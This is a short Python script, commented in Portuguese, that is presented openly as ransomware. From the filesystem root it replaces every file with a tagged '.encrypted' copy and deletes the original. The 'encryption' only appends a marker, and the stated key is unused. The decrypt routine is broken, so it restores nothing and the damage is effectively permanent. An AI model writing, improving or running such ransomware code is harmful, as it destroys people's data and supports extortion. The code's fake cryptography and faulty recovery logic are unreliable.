import os
import time
import shutil

# Dados do ransomware
RAMSONWARE_NAME = "RAMSONWARE"
TARGET_DIR = "/"
DECRYPT_KEY = "xY6sFv9T3zRpEaWn"
EXTENSION = ".encrypted"

def get_files_to_encrypt():
    encrypted_files = []

    for root, dirs, files in os.walk(TARGET_DIR):
        for file in files:
            if not file.endswith(EXTENSION):
                encrypted_files.append(os.path.join(root, file))

    return encrypted_files

def encrypt_file(file_path):
    with open(file_path, "rb") as file:
        file_data = file.read()

    encrypted_data = file_data + b"\nENCRYPTED BY " + RAMSONWARE_NAME.encode()

    with open(file_path + EXTENSION, "wb") as file:
        file.write(encrypted_data)

    os.remove(file_path)

def decrypt_file(file_path):
    with open(file_path, "rb") as file:
        file_data = file.read()

    if file_data.endswith(b"\nENCRYPTED BY " + RAMSONWARE_NAME.encode()):
        decrypted_data = file_data[:-len(RAMSONWARE_NAME + "\nENCRYPTED BY ")]

        with open(file_path[:-len(EXTENSION)], "wb") as file:
            file.write(decrypted_data)

        os.remove(file_path)

def encrypt_files():
    files_to_encrypt = get_files_to_encrypt()

    for file in files_to_encrypt:
        encrypt_file(file)

        print(f"Encrypted file: {file}")
        time.sleep(1)

def decrypt_files():
    encrypted_files = get_files_to_encrypt()

    for file in encrypted_files:
        decrypt_file(file)

        print(f"Decrypted file: {file}")
        time.sleep(1)

# Ações do ransomware
if __name__ == "__main__":
    encrypt_files()
    time.sleep(5)
    decrypt_files()